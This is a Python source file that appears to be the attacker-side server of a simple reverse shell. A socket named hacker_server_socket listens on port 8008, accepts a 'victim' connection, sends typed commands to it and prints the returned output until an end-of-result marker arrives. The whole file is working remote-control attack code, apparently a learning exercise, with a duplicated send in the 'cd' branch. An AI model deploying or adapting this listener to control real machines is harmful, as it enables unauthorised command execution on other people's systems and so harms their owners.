import socket

IDENTIFIER = "<END_OF_COMMAND_RESULT>"

if __name__ == "__main__":
    # IPv4 with TCP connection
    hacker_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "127.0.0.1"
    port = 8008
    socket_address = (IP,port)
    # need tuple of ip and port
    hacker_server_socket.bind(socket_address)
    hacker_server_socket.listen(5)
    print("listenig for incoming connection request")
    hacker_server_socket, victim_client_address = hacker_server_socket.accept()
    print("connection established with: ",victim_client_address)
    try:
        while True :
            command = input("enter command ")
            hacker_server_socket.send(command.encode())
            if command == "stop":
                hacker_server_socket.close()
                break
            elif command == "":
                continue
            # message = "hi, i hacked you"
            # message_bytes = message.encode()
            elif command.startswith("cd"):
                    hacker_server_socket.send(command.encode())
                    continue
            else:
                full_command_result = b""
                while True:
                    
                    chunk = hacker_server_socket.recv(1048)
                    if chunk.endswith(IDENTIFIER.encode()):
                        chunk = chunk[:-len(IDENTIFIER)]
                        full_command_result += chunk
                        break
                    
                    full_command_result += chunk
                    
                print(full_command_result.decode())
            # command_result = hacker_server_socket.recv(1048)
            # print(command_result.decode())
            # print("message has be send!")
    except Exception:
        print("exception occured")
        hacker_server_socket.close()